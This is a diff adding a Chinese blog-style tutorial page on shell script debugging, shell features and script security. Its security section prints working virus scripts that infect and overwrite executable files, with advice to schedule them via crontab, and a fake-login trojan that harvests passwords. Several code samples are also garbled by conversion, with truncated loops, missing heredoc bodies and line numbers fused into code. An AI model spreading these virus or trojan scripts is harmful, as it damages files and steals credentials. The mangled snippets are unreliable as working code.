@@ -1,0 +1,1563 @@
+<!doctype html>
+<html lang="en-us">
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+    <title>shell浅谈之十二shell调试及主题 | 开发者问答集锦</title>
+    <meta property="og:title" content="shell浅谈之十二shell调试及主题 - 开发者问答集锦">
+    <meta property="og:type" content="article">
+        
+    <meta property="article:published_time" content='2020-09-02T00:00:00&#43;08:00'>
+        
+        
+    <meta property="article:modified_time" content='2020-09-02T00:00:00&#43;08:00'>
+        
+    <meta name="Keywords" content="">
+    <meta name="description" content="shell浅谈之十二shell调试及主题">
+        
+    <meta name="author" content="">
+    <meta property="og:url" content="https://zaina.newban.cn/posts/shell%E6%B5%85%E8%B0%88%E4%B9%8B%E5%8D%81%E4%BA%8Cshell%E8%B0%83%E8%AF%95%E5%8F%8A%E4%B8%BB%E9%A2%98/">
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+
+    <link rel="stylesheet" href='/css/normalize.css'>
+    <link rel="stylesheet" href='/css/style.css'>
+    <script type="text/javascript" src="//cdn.bootcdn.net/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+
+    
+    
+    
+    
+    
+    
+</head>
+
+
+<body>
+    <header id="header" class="clearfix">
+    <div class="container">
+        <div class="col-group">
+            <div class="site-name ">
+                
+                    <a id="logo" href="https://zaina.newban.cn">
+                        开发者问答集锦
+                    </a>
+                
+                
+            </div>
+            <div>
+                <nav id="nav-menu" class="clearfix">
+                    <a class="" href="https://zaina.newban.cn">首页</a>
+                    
+                </nav>
+            </div>
+        </div>
+    </div>
+</header>
+
+    <div id="body">
+        <div class="container">
+            <div class="col-group">
+
+                <div class="col-8" id="main">
+                    
+<div class="res-cons">
+    
+    <article class="post">
+        <header>
+            <h1 class="post-title">shell浅谈之十二shell调试及主题</h1>
+        </header>
+        <date class="post-meta meta-date">
+            2020年9月2日
+        </date>
+        
+        
+        <div class="post-meta">
+            <span id="busuanzi_container_page_pv">|<span id="busuanzi_value_page_pv"></span><span>
+                    阅读</span></span>
+        </div>
+        
+        
+        <div class="post-content">
+            
+
+<h1 id="一-简介">一、简介</h1>
+
+<p>Shell中不存在调试器，对脚本中产生的语法错误只会产生模糊的错误提示信息。shell中也经常存在隐涩的逻辑错误，使得脚本无法按照程序员的意愿运行。因此shell脚本的调试有了很大的难度。好的编程风格和习惯也是为了减小调试程序的难度。</p>
+
+<h1 id="二-详解">二、详解</h1>
+
+<h2 id="1-shell调试技术">1、Shell调试技术</h2>
+
+<p>Shell脚本调试就是发现引发脚本错误的原因以及在脚本源代码中定位发生错误的行，常用的手段包括分析输出的错误信息、通过在脚本中加入调试语句、输出调试信息来辅助诊断错误、利用调试工具等。</p>
+
+<p>（1）shell错误</p>
+
+<p>Shell脚本的错误可以分为两类，第一类是Shell脚本中存在的语法错误，这种比较直观，只要定位发生错误的代码段或行，比如漏写关键字、漏写引号、空格符该有而未有、变量大小写不区分等；第二类是Shell脚本能够执行完毕，但并不是按照我们所期望的方式运行，即存在逻辑错误，这种比较隐晦，并不影响脚本的正常执行。</p>
+
+<p><strong>[cpp]</strong> view plain  copy</p>
+
+<ol>
+<li>#!/bin/bash</li>
+<li>count=1</li>
+<li>MAX=5</li>
+<li>5. while [ &ldquo;$SECONDS&rdquo; -le &ldquo;$MAX&rdquo; ];do</li>
+<li>echo &ldquo;This is the $count time to sleep.&rdquo;</li>
+<li>count=$count+1</li>
+<li>###正确应是: let count=$count+1,把count当作整数处理</li>
+<li>sleep 2</li>
+<li>done</li>
+<li>12. echo &ldquo;The running time of this script is $SECONDS&rdquo;</li>
+</ol>
+
+<p><strong>[cpp]</strong> view plain  copy</p>
+
+<ol>
+<li>#!/bin/bash</li>
+<li>3. Var1=56</li>
+<li>Var2=865</li>
+<li>6. let Var3=Var1*var2</li>
+<li>###正确的是: let Var3=Var1*Var2,未区分大小写字母，变量var2=0</li>
+<li>echo &ldquo;$Var1*$Var2=$Var3&rdquo;</li>
+</ol>
+
+<p>（2）shell调试技术之一：trap命令</p>
+
+<p>trap命令是linux内建命令，用于捕捉信号。trap命令可以指定收到某种信号时所执行的命名，格式为：trap command sig1 sig2 &hellip;
+sigN。</p>
+
+<p>Shell脚本执行会产生三个所谓的“伪信号”（因为这三个信号是shell产生的，而其他信号是由操作系统产生的），可以利用trap命令捕获这三个“伪信号”。它们分别是EXIT、ERR和DEBUG，其产生条件如下表：</p>
+
+<p><a href="https://img.it610.com/image/info8/28dcb5ef364747339cff120ca193ade3.jpg"><img src="https://img.it610.com/image/info8/28dcb5ef364747339cff120ca193ade3.jpg" alt="" /></a></p>
+
+<p>trap命令通过捕捉三种“伪信号”能方便地随时监控变量的变化、正常函数和脚本的结束、跟踪异常的函数和命令。</p>
+
+<p><strong>[cpp]</strong> view plain  copy</p>
+
+<ol>
+<li>#利用trap命令捕捉DEBUG信号跟踪变量值</li>
+<li>#!/bin/bash</li>
+<li>4. trap &lsquo;echo &ldquo;before execute line:$LINENO, a=$a,b=$b,c=$c&rdquo;&rsquo; DEBUG #LINENO是shell内部变量,打印执行命令的行号</li>
+<li>a=0</li>
+<li>b=2</li>
+<li>c=100</li>
+<li>while : #冒号相当于TRUE</li>
+<li>do</li>
+<li>if ((a &gt;= 10)) #i大于等于10时，跳出while循环</li>
+<li>then</li>
+<li>break</li>
+<li>fi</li>
+<li>echo &ldquo;*************&rdquo;</li>
+<li>let &ldquo;a=a+2&rdquo;</li>
+<li>let &ldquo;b=b*2&rdquo;</li>
+<li>let &ldquo;c=c-10&rdquo;</li>
+<li>done</li>
+</ol>
+
+<p><a href="https://img.it610.com/image/info8/95f30db152f242b9999421a22fcc0b28.png"><img src="https://img.it610.com/image/info8/95f30db152f242b9999421a22fcc0b28.png" alt="shell浅谈之十二shell调试及主题_第1张图片" /></a></p>
+
+<p>上图为部分输出截图，其中由于trap命令的存在，每执行一行命名前都输出a、b、c三个变量的值。执行第5行a=0前捕捉到DEBUG信号，打印未初始化的三个变量的值。trap、do、then、done、fi都无DEBUG信号发出。</p>
+
+<p>利用trap命令捕获DEBUG信号，只需一条trap语句就可以完成对相关变量的全程跟踪，分析运行结果可以看到整个脚本的执行轨迹，判断哪些条件分支执行了哪些条件分支没有执行。</p>
+
+<p><strong>[cpp]</strong> view plain  copy</p>
+
+<ol>
+<li>#利用trap命令捕捉EXIT信号跟踪函数结束</li>
+<li>#!/bin/bash</li>
+<li>4. fun1()</li>
+<li>{</li>
+<li>echo &ldquo;This is an correct function&rdquo;</li>
+<li>var=2010</li>
+<li>return 0 #return不发送EXIT信号</li>
+<li>}</li>
+<li>trap &lsquo;echo &ldquo;Line:$LINENO,var=$var&rdquo;&rsquo; EXIT</li>
+<li>echo &ldquo;*************&rdquo;</li>
+<li>fun1</li>
+<li>echo &ldquo;&mdash;&mdash;&mdash;&mdash;&rdquo;</li>
+<li>exit 0 #发送EXIT信号，执行结果： Line:1,var=2010</li>
+</ol>
+
+<p><strong>[cpp]</strong> view plain  copy</p>
+
+<ol>
+<li>#trap捕捉ERR信号跟踪函数或命名异常，一条命令返回非零状态码时即执行不成功</li>
+<li>#!/bin/bash</li>
+<li>4. fun2()</li>
+<li>{</li>
+<li>echo &ldquo;This is an error function&rdquo;</li>
+<li>var=2010</li>
+<li>return 1 #非零被认为是异常函数，产生ERR信号</li>
+<li>}</li>
+<li>trap &lsquo;echo &ldquo;Line:$LINENO,var=$var&rdquo;&rsquo; ERR</li>
+<li>fun2</li>
+<li>ipconfig #错误的命令，正确是ifconfig，产生ERR信号</li>
+</ol>
+
+<p>（3）shell调试技术之二：tee命令</p>
+
+<p>tee命令产生的数据流向字母T，将一个输出分为两个支流，一个到标准输出另一个到某输出文件。tee的特性可以使用到shell的管道及输入/输出重定向的调试上，使用管道时，其中间结果不会显示在屏幕上，若管道连接的一系列命名的执行并非预期结果，则调试出现困难，此时就得借助于tee命名。</p>
+
+<p>利用tee命令获得机器的IP地址（非常实用）。</p>
+
+<p><strong>[cpp]</strong> view plain  copy</p>
+
+<ol>
+<li>#!/bin/bash</li>
+<li>3. localIP=<code>cat /etc/sysconfig/network-scripts/ifcfg-p4p1 | tee debug.log | grep 'IPADDR' | tee -a debug.log | cut -d= -f2 | tee -a debug.log</code></li>
+<li>echo &ldquo;The local IP is: $localIP&rdquo;</li>
+</ol>
+
+<p><a href="https://img.it610.com/image/info8/f1ee4bf5fb30456491c14d9d2fb677e6.jpg"><img src="https://img.it610.com/image/info8/f1ee4bf5fb30456491c14d9d2fb677e6.jpg" alt="" /></a></p>
+
+<p><strong>[cpp]</strong> view plain  copy</p>
+
+<ol>
+<li>#!/bin/bash</li>
+<li>3. localIP=<code>ifconfig | grep 'inet addr' | grep -v '127.0.0.1' | cut -d: -f3 | awk '{print $1}'</code></li>
+<li>echo &ldquo;The local IP is: $localIP&rdquo;</li>
+</ol>
+
+<p>在当前目录下会产生debug.log文件，tee -a追加到文件，因此debug.log保存了处理的信息，查看文件了解管道间的数据流向。</p>
+
+<p>tee命令适用于管道的调试，观察tee命令产生的中间结果文件，可以清晰地看出管道间的数据流向。</p>
+
+<p>（4）shell调试技术之三：调试钩子</p>
+
+<p>调试钩子也称为调试块，实际上是if/then结构的代码块，在程序开发调试阶段将DEBUG设置成TRUE，到发布阶段将DEBUG设置成FALSE，关闭调试钩子，无须删除代码。调试钩子的代码：</p>
+
+<p><strong>[cpp]</strong> view plain  copy</p>
+
+<ol>
+<li>DEBUG()</li>
+<li>{</li>
+<li>if [ &ldquo;$DEBUG&rdquo; = &ldquo;true&rdquo; ]</li>
+<li>then</li>
+<li>echo &ldquo;Debugging information:&rdquo;</li>
+<li>fi</li>
+<li>}</li>
+</ol>
+
+<p>调试钩子中DEBUG是一个全局变量，开发调试阶段，可利用export DEBUG=true命令将DEBUG设置成true，执行调试信息。</p>
+
+<p><strong>[cpp]</strong> view plain  copy</p>
+
+<ol>
+<li>#!/bin/bash</li>
+<li>3. DEBUG()</li>
+<li>{</li>
+<li>if [ &ldquo;$DEBUG&rdquo; = &ldquo;true&rdquo; ]</li>
+<li>then</li>
+<li>$@ #输出所有参数信息与$*等价</li>
+<li>fi</li>
+<li>}</li>
+<li>11. a=0</li>
+<li>b=2</li>
+<li>c=100</li>
+<li>DEBUG echo &ldquo;a=$a b=$b c=$c&rdquo; #第1个调试钩子</li>
+<li>while :</li>
+<li>do</li>
+<li>DEBUG echo &ldquo;a=$a b=$b c=$c&rdquo; #第2个调试钩子</li>
+<li>if ((a &gt;= 10)) #当a大于等于10时，跳出while循环</li>
+<li>then</li>
+<li>break</li>
+<li>fi</li>
+<li>23. let &ldquo;a=a+2&rdquo; #a、b、c值不断变化</li>
+<li>let &ldquo;b=b*2&rdquo;</li>
+<li>let &ldquo;c=c-10&rdquo;</li>
+<li>done</li>
+</ol>
+
+<p><a href="https://img.it610.com/image/info8/392af67072144f21ac1a2ee0f68eb820.png"><img src="https://img.it610.com/image/info8/392af67072144f21ac1a2ee0f68eb820.png" alt="shell浅谈之十二shell调试及主题_第2张图片" /></a></p>
+
+<p>（5）shell调试技术之四：shell选项</p>
+
+<p>利用set命令开启和关闭shell选项的方法，不用修改源代码即可输出相关的调试信息。用于脚本的调试选项是-n、-x和-c。</p>
+
+<p><a href="https://img.it610.com/image/info8/81143d4e715d4c578980dc4b3c393bbe.jpg"><img src="https://img.it610.com/image/info8/81143d4e715d4c578980dc4b3c393bbe.jpg" alt="shell浅谈之十二shell调试及主题_第3张图片" /></a></p>
+
+<p>Shell脚本编写完成后，使用-
+n选项来测试脚本是否存在语法错误是一个很好的习惯。因为实际执行脚本会对系统环境产生影响，则执行时发现语法错误还得做一系列的系统环境的恢复工作，才能继续测试脚本。脚本中开启-
+n选项，使用set -n或set -o noexec，脚本会检测语法并不执行。也可以利用sh命名直接对脚本进行语法检查：sh -n 脚本名。</p>
+
+<p>-x选项用来跟踪脚本的执行，把实际执行的每一条命令行显示出来，并在行首显示一个“+”符号，“+”符号后面显示的是经过了变量替换之后的命名行内容，有助于分析实际执行的命令。-x选项经常与trap捕捉DEBUG信号结合使用，这样既可以输出实际执行的每一条命令又可以逐行跟踪相关变量的值，对调试有很大的帮助。可在脚本内使用set -x或使用sh -x执行脚本。</p>
+
+<p>-x选项以“+”作为提示符表示调试信息，显得美中不足，可以通过shell提供的三个有用的内部变量定制-x选项的提示符。设置PS4使得-x提示符能包含LINENO和FUNCNAME等丰富的信息。</p>
+
+<p><a href="https://img.it610.com/image/info8/8637b8fdfb1e4db5b271bc43a8bcd3d1.jpg"><img src="https://img.it610.com/image/info8/8637b8fdfb1e4db5b271bc43a8bcd3d1.jpg" alt="shell浅谈之十二shell调试及主题_第4张图片" /></a></p>
+
+<p><strong>[cpp]</strong> view plain  copy</p>
+
+<ol>
+<li>#!/bin/bash</li>
+<li>3. isroot() #判断执行脚本的用户是否是root</li>
+<li>{</li>
+<li>if [ &ldquo;$UID&rdquo; -ne 0 ]</li>
+<li>then</li>
+<li>return 1</li>
+<li>else</li>
+<li>return 0</li>
+<li>fi</li>
+<li>}</li>
+<li>13. echoroot()</li>
+<li>{</li>
+<li>isroot #调用函数</li>
+<li>if [ &ldquo;$?&rdquo; -ne 0 ]</li>
+<li>then</li>
+<li>echo &ldquo;I am not ROOT user!&rdquo;</li>
+<li>else</li>
+<li>echo &ldquo;ROOT user!&rdquo;</li>
+<li>fi</li>
+<li>}</li>
+<li>24. export PS4=&lsquo;+{$LINENO:${FUNCNAME[0]}:${FUNCNAME[1]}}&rsquo; #对PS4变量重新赋值</li>
+<li>echoroot</li>
+</ol>
+
+<p>-c选项作用是使用shell解释器从一个字符串中而不是文件中读取并执行shell命名，仅用于临时测试一小段脚本的执行结果，而在shell命令行直接输入也会达到相同效果， 因此使用频率不高。如sh -c &lsquo;a=2;b=2012;let c=$a*$b;echo &ldquo;c=$c&rdquo;&lsquo;，命令间用分号分隔。</p>
+
+<h2 id="2-shell主题">2、Shell主题</h2>
+
+<p>（1）Shell说明和用户提示信息</p>
+
+<p><strong>[cpp]</strong> view plain  copy</p>
+
+<ol>
+<li>#!/bin/bash</li>
+<li>3. flag=0;</li>
+<li>5. echo &ldquo;This script is used to username and password what you input is right or wrong. &ldquo;</li>
+<li>7. for ((i=0 ; i</li>
+<li>do</li>
+<li>echo -n &ldquo;Please input your name: &ldquo;</li>
+<li>read username</li>
+<li>12. echo -n &ldquo;Please input your password: &ldquo;</li>
+<li>read password</li>
+<li>15. if test &ldquo;$username&rdquo; = &ldquo;user&rdquo; -a &ldquo;$password&rdquo; = &ldquo;pwd&rdquo;</li>
+<li>then</li>
+<li>echo &ldquo;login success&rdquo;</li>
+<li>flag=1</li>
+<li>break</li>
+<li>else</li>
+<li>echo &ldquo;The username or password is wrong!&rdquo;</li>
+<li>fi</li>
+<li>done</li>
+<li>25. if [ &ldquo;$flag&rdquo; -eq &ldquo;0&rdquo; ]</li>
+<li>then</li>
+<li>echo &ldquo;You have tried 3 times. Login fail!&rdquo;</li>
+<li>fi</li>
+</ol>
+
+<p>（2） Shell特殊命令，shift和getopts</p>
+
+<p>shift命令主要用于向脚本传递参数时每次将参数位置向左偏移一位。</p>
+
+<p>使用shift显示所有的命令行参数：</p>
+
+<p><strong>[cpp]</strong> view plain  copy</p>
+
+<ol>
+<li>#!/bin/bash</li>
+<li>3. echo &ldquo;number of arguments is $#&rdquo;</li>
+<li>5. echo &ldquo;What you input is: &ldquo;</li>
+<li>7. while [[ &ldquo;$*&rdquo; != &ldquo;&rdquo; ]] #等价于while [ &ldquo;$#&rdquo; -gt 0 ]</li>
+<li>do</li>
+<li>echo &ldquo;$1&rdquo;</li>
+<li>shift</li>
+<li>done</li>
+</ol>
+
+<p>Shell中提供了一条获取和处理命令行选项的getopts语句，使得控制多个命令行参数更加容易。格式为getopts option
+variable，option中包含一个有效的单字符选项。若getopts命令在命令行中发现了连字符，那么命名将用连字符后面的字符与option相比较，若匹配成功则
+把变量variable值设为该选项，若匹配不成功，则 variable设为“?”。当getopts发现连字符后面没有字符后会返回一个非零的状态值。</p>
+
+<p>有时有必要在脚本中指定命令行选项取值，getopts提供了一种方式，在option中将一个冒号放在选项后，如getopts ab: variable表示-
+a后可以不加实际值进行传递，而-b后必须取值，如果试图不取值传递此选项，会返回一个错误信息。有时错误信息提示并不明确，需要自己定义提示信息屏蔽它，那么将冒号放在option的开始部分，如getopts
+:ab: variable。</p>
+
+<p><strong>[cpp]</strong> view plain  copy</p>
+
+<ol>
+<li>#!/bin/bash</li>
+<li>3. while getopts &ldquo;:fh:&rdquo; optname</li>
+<li>do</li>
+<li>case &ldquo;$optname&rdquo; in</li>
+<li>f)</li>
+<li>echo &ldquo;Option $optname is specified&rdquo;</li>
+<li>;;</li>
+<li>h)</li>
+<li>echo &ldquo;Option $optname has value $OPTARG&rdquo;</li>
+<li>;;</li>
+<li>\?)</li>
+<li>echo &ldquo;Unknown option $OPTARG&rdquo;</li>
+<li>;;</li>
+<li>:)</li>
+<li>echo &ldquo;No parameter value for option $OPTARG&rdquo;</li>
+<li>;;</li>
+<li>*)</li>
+<li>echo &ldquo;Unknown error while processing options&rdquo;</li>
+<li>;;</li>
+<li>esac</li>
+<li>done</li>
+<li>24. shift $(($OPTIND - 1))</li>
+<li>26. for options in &ldquo;$@&rdquo;</li>
+<li>do</li>
+<li>if [ ! -f $2 ]</li>
+<li>then</li>
+<li>echo &ldquo;Can not find file $options . &ldquo;</li>
+<li>else</li>
+<li>echo &ldquo;Find the file $options . &ldquo;</li>
+<li>fi</li>
+<li>done</li>
+</ol>
+
+<p><a href="https://img.it610.com/image/info8/f2a948bad7f64fa6a146c8c2a97b3759.jpg"><img src="https://img.it610.com/image/info8/f2a948bad7f64fa6a146c8c2a97b3759.jpg" alt="shell浅谈之十二shell调试及主题_第5张图片" /></a><br />
+-f用于判断输入的第二哥命令行参数是否为文件，而-h 后必须取值。</p>
+
+<p>（3）Shell中/dev文件系统</p>
+
+<p>Shell中存在伪文件系统/dev，该文件系统包含每个物理设备对应的文件。若需挂载物理设备或虚拟物理设备则可通过操作/dev完成。/dev/null和/dev/zero是两个特殊的伪设备，它们是虚拟的仅仅存在于软件的虚拟设备中。</p>
+
+<p>/dev/zero是一个非常有用的伪设备，它用于创建空文件也可以创建RAM文件，可通过/dev/zero来建立一个交换文件。</p>
+
+<p>/dev/null相当于一个文件的“黑洞”
+，它非常接近于一个只写文件，所以写入它的内容都会永远丢失。若不想使用stdout，可以通过使用/dev/null将stdout禁止。如find /
+-name string &gt; /dev/null，把查找的错误提示转移到特定的目录中。shell中会有如下命令： &gt;/dev/null
+2&gt;&amp;1，其中”&gt;/dev/null“等价于”1&gt;/dev/null“表示标准输出重定向到空设备文件，“2&gt;&amp;1”表示标准错误输出重定向等同于标准输出，也重定向到空设备文件。例如find
+/ -name string &gt; result.log 2&gt;&amp;1（等价于find / -name string 2&gt; result.log 1&gt;&amp;2）。</p>
+
+<p>（4）Shell中/proc文件系统</p>
+
+<p>/proc文件系统是一个伪文件系统，它只存在内存中而不占用外存空间。它以文件系统的方式为访问系统内核数据的操作提供接口。用户和应用程序可以通过/proc得到系统的信息并可以改变内核的某些参数。由于系统的信息（如进程）是动态改变的，所以/proc文件系统是动态地从系统内核读出所需信息并提交的。/proc内的文件常被称为虚拟文件，有些文件使用查看命令查看会返回大量信息但文件本身的大小却会显示0字节。</p>
+
+<p>在/proc下有三个很重要的目录：net、scsi和sys。sys目录可写，可通过它来访问或修改内核的参数，而net和scsi则依赖于内核配置。</p>
+
+<p>cat
+/proc/interrupts查看中断，/proc/sys目录修改内核参数来优化系统，/proc中有编号（为进程ID）的子目录可以查看运行中的进程信息，cat
+/proc/filesystems | awk -F&rsquo;\t&rsquo; &lsquo;{print $2}&lsquo;查看文件系统支持的类型，cat
+/proc/net/sockstat查看网络信息，cat /proc/net/tcp查看TCP的具体使用情况。</p>
+
+<p>（5）带颜色的shell脚本</p>
+
+<p>Shell脚本中，脚本执行终端的颜色可以使用“ANSI非常规字符序列”来生成，如echo -e &ldquo;\033[44;37;5m Hello
+World\033[0m&rdquo;，将前景色设置成蓝色，背景色设置成白色。-e用于激活特殊字符的解析器，\033引导非常规字符序列，m意味着设置属性并结束非常规字符序列，&rdquo;44;37;5&rdquo;可以生成不同颜色的组合，数值和编码的前后顺序无关。</p>
+
+<p>选择的编码表：</p>
+
+<p><a href="https://img.it610.com/image/info8/6464ced297c14354befbb061c25dd5be.jpg"><img src="https://img.it610.com/image/info8/6464ced297c14354befbb061c25dd5be.jpg" alt="" /></a></p>
+
+<p><a href="https://img.it610.com/image/info8/340804ddf0e247cfbbf7fe56b8cec5d9.jpg"><img src="https://img.it610.com/image/info8/340804ddf0e247cfbbf7fe56b8cec5d9.jpg" alt="shell浅谈之十二shell调试及主题_第6张图片" /></a></p>
+
+<p><strong>[cpp]</strong> view plain  copy</p>
+
+<ol>
+<li>#输出彩色的字符串的形式</li>
+<li>#!/bin/bash</li>
+<li>4. cfont()</li>
+<li>{</li>
+<li>while ((&ldquo;$#&rdquo;!= 0))</li>
+<li>do</li>
+<li>case $1 in</li>
+<li>-b)</li>
+<li>echo -ne &ldquo; &ldquo;</li>
+<li>;;</li>
+<li>-t)</li>
+<li>echo -ne &ldquo;\t&rdquo;</li>
+<li>;;</li>
+<li>-n)</li>
+<li>echo -ne &ldquo;\n&rdquo;</li>
+<li>;;</li>
+<li>-black)</li>
+<li>echo -ne &ldquo;\033[30m&rdquo; #黑色前景</li>
+<li>;;</li>
+<li>-red)</li>
+<li>echo -ne &ldquo;\033[31m&rdquo; #红色前景</li>
+<li>;;</li>
+<li>-green)</li>
+<li>echo -ne &ldquo;\033[32m&rdquo; #绿色前景</li>
+<li>;;</li>
+<li>-yellow)</li>
+<li>echo -ne &ldquo;\033[33m&rdquo; #黄色前景</li>
+<li>;;</li>
+<li>-blue)</li>
+<li>echo -ne &ldquo;\033[34m&rdquo; #蓝色前景</li>
+<li>;;</li>
+<li>-purple)</li>
+<li>echo -ne &ldquo;\033[35m&rdquo; #紫色前景</li>
+<li>;;</li>
+<li>-cyan)</li>
+<li>echo -ne &ldquo;\033[36m&rdquo; #青色前景</li>
+<li>;;</li>
+<li>-white|-gray)</li>
+<li>echo -ne &ldquo;\033[37m&rdquo; #白色/灰色前景</li>
+<li>;;</li>
+<li>-reset)</li>
+<li>echo -ne &ldquo;\033[0m&rdquo; #重新设置属性到默认设置</li>
+<li>;;</li>
+<li>-h|-help|&ndash;help)</li>
+<li>echo &ldquo;Usage: cfont -color1 message1 -color2 message2 &hellip;&rdquo;</li>
+<li>echo &ldquo;eg: cfont -red [ -blue message1 message2 -red ]&rdquo;</li>
+<li>;;</li>
+<li>*)</li>
+<li>echo -ne &ldquo;$1&rdquo;</li>
+<li>;;</li>
+<li>esac</li>
+<li>54. shift</li>
+<li>done</li>
+<li>}</li>
+<li>58. cfont -green &ldquo;Start service &hellip;&rdquo; -red &ldquo; [&rdquo; -blue &ldquo; OK&rdquo; -red &ldquo; ]&rdquo; -black -n</li>
+</ol>
+
+<p><a href="https://img.it610.com/image/info8/7e5c862eeb4240bc94ff090ab760f1a5.jpg"><img src="https://img.it610.com/image/info8/7e5c862eeb4240bc94ff090ab760f1a5.jpg" alt="" /></a></p>
+
+<h2 id="3-shell脚本安全">3、Shell脚本安全</h2>
+
+<p>（1）shc工具加密shell脚本</p>
+
+<p>若Shell脚本中包含敏感的口令或其他重要信息，而且不希望用户通过ps
+-ef捕获敏感信息，可用shc工具给脚本增加一层额外的安全保护。shc使用RC4加密算法把shell脚本转换成二进制可执行文件（支持静态和动态链接）。</p>
+
+<p>shc安装后使用命名进行加密：shc -v -f
+filename.sh，-v是输出详细编译日志，-f指定脚本的名称。加密成功后会生成以.x和.c结尾的两个新文件，如生成可执行文件filename.sh.x和C语言源文件filename.sh.x.c。</p>
+
+<p>（2）shell脚本简单病毒</p>
+
+<p>最原始的shell病毒:</p>
+
+<p><strong>[cpp]</strong> view plain  copy</p>
+
+<ol>
+<li>#!/bin/bash</li>
+<li>3. for file in *</li>
+<li>do</li>
+<li>cp $0 $file</li>
+<li>done</li>
+</ol>
+
+<p>遍历当前文件系统的所有文件，然后覆盖所有文件，但linux是多用户操作系统，它的文件具有保护模式，所以上述脚本会报出一大堆错误，所以会很快被管理员发现并制止它的传染，为增强其隐蔽性对脚本进行改进：</p>
+
+<p><strong>[cpp]</strong> view plain  copy</p>
+
+<ol>
+<li>#!/bin/bash</li>
+<li>3. for file in *</li>
+<li>do</li>
+<li>if test -f $file #测试是否是文件</li>
+<li>then</li>
+<li>if test -x $file #测试文件是否可执行</li>
+<li>then</li>
+<li>if test -w $file #测试文件是否可读</li>
+<li>then</li>
+<li>grep -s &ldquo;myself_flag&rdquo; $file &gt; .temp 2&gt;&amp;1 #判断自己的一个标志，是否为该shell脚本</li>
+<li>#可以写成 if file $file | grep -s &lsquo;shell script&rsquo; &gt; /dev/null</li>
+<li>if [ $? -ne 0 ]</li>
+<li>then</li>
+<li>cp -f $0 $file</li>
+<li>fi</li>
+<li>fi</li>
+<li>fi</li>
+<li>fi</li>
+<li>done</li>
+<li>rm .temp -f</li>
+</ol>
+
+<p>但是脚本病毒一旦在感染完毕后就什么也不做了，它没有像二进制病毒那样的潜伏的危害性，只是简单的覆盖宿主而已。</p>
+
+<p>下面利用传统的二进制病毒的感染机制并优化的代码：</p>
+
+<p><strong>[cpp]</strong> view plain  copy</p>
+
+<ol>
+<li>#!/bin/bash infection</li>
+<li>for file in * ; do</li>
+<li>if test -f $file &amp;&amp; test -x $file &amp;&amp; test -w $file ; then</li>
+<li>if grep -s &ldquo;myself_flag&rdquo; $file &gt; /dev/null ; then</li>
+<li>head -n 1 $file &gt; .mm #提取要感染的脚本第一行</li>
+<li>if grep -s &ldquo;infection&rdquo; .mm &gt; /dev/null ; then</li>
+<li>rm .mm -f</li>
+<li>else</li>
+<li>cat $file &gt; .SAVE #借助传统的二进制的感染机制</li>
+<li>head -n 14 $0 &gt; $file</li>
+<li>cat .SAVE &gt;&gt; $file #追加到文件</li>
+<li>fi;fi;fi</li>
+<li>done</li>
+<li>rm .SAVE .mm -f</li>
+</ol>
+
+<p>接着可以使用crontab命令让系统以一定的时间间隔调度这些命令执行或设置成开机自动运行即可。</p>
+
+<p>（2）shell木马</p>
+
+<p>Shell中同样存在木马，它看上去无害，却隐藏着很大的危险。</p>
+
+<p><strong>[cpp]</strong> view plain  copy</p>
+
+<ol>
+<li>#!/bin/bash</li>
+<li>clear</li>
+<li>cat /etc/issue</li>
+<li>echo -n &ldquo;login:&rdquo;</li>
+<li>read login</li>
+<li>echo -n &ldquo;password:&rdquo;</li>
+<li>stty -echo</li>
+<li>read passwd</li>
+<li>stty sane</li>
+<li>mail $USER &lt;</li>
+<li>login:$login</li>
+<li>passwd:$passwd</li>
+<li>fin</li>
+<li>echo</li>
+<li>echo &ldquo;login incorrect&rdquo;</li>
+<li>sleep 1</li>
+<li>exit 0</li>
+</ol>
+
+<p>一个盗取别人passwd的shell脚本，当然有经验的linux使用者以下就能区分出来，可以将该木马做的更隐蔽。</p>
+
+<h2 id="4-shell简单应用">4、Shell简单应用</h2>
+
+<p>（1）将文本转换成HTML</p>
+
+<p><strong>[cpp]</strong> view plain  copy</p>
+
+<ol>
+<li>B Liu:Shanghai Jiaotong University:Shanghai:China</li>
+<li>C Lin:University of Toronto:Toronto:Canada</li>
+<li>D Hou:Beijing University:Beijing:China</li>
+<li>J Luo:Southeast University:Nanjing:China</li>
+<li>Y Zhang:Victory University:Melbourne:Australia</li>
+</ol>
+
+<p>新建htmlconver.sh脚本，chmod +x htmlconver.sh，然后执行./htmlconver.sh &lt; html.txt &gt;
+conver.html。</p>
+
+<p><strong>[cpp]</strong> view plain  copy</p>
+
+<ol>
+<li>#!/bin/bash</li>
+<li>cat &lt;</li>
+<li>HTML PUBLIC &ldquo;-//W3C//DTD HTML 4.0 Transitional//EN&rdquo; &ldquo;<a href="http://www.w3.org/TR/html4/loose.dtd&quot;&gt;">http://www.w3.org/TR/html4/loose.dtd&quot;&gt;</a></li>
+<li>5.   6.   7. information</li>
+<li>9.   10.   11.   12. CLOUD</li>
+<li>14. sed -e &rsquo;s/://g&rsquo; -e &rsquo;s/^/| /g&rsquo; -e &rsquo;s/$//g&rsquo;</li>
+
+<li><p>#等价于awk &lsquo;BEGIN {FS=&rdquo;:&ldquo;;OFS=&rdquo;
+| &ldquo;} gsub(/^/,&rdquo;<br />
+&mdash;|&mdash;<br />
+<TD>&rdquo;) gsub(/$/,&rdquo;<br />
+&rdquo;) {print $1,$2,$3,$4}&rsquo;</p></li>
+
+<li><p>cat &lt;</p></li>
+
+<li><ol>
+<li>19.   20. CLOUD</li>
+</ol></li>
+</ol>
+
+<p>（2）crontab定时任务</p>
+
+<p>crondtab是linux下用来周期性的执行某种任务或等待处理某些事件的一个守护进程，与windows下的计划任务类似，crondtab进程每分钟会定期检查是否有要执行的任务，如果有要执行的任务，则自动执行该任务。</p>
+
+<p>每个用户都有自己的调度crontab，可以使用crontab -u user -e或切换到user使用vim /etc/crontab（也可crontab
+-e）编辑crontab定时任务调度表。crontab命令选项意义如下：</p>
+
+<p><a href="https://img.it610.com/image/info8/f260ff9ce7d04c1197dc4beb70682a07.jpg"><img src="https://img.it610.com/image/info8/f260ff9ce7d04c1197dc4beb70682a07.jpg" alt="shell浅谈之十二shell调试及主题_第7张图片" /></a></p>
+
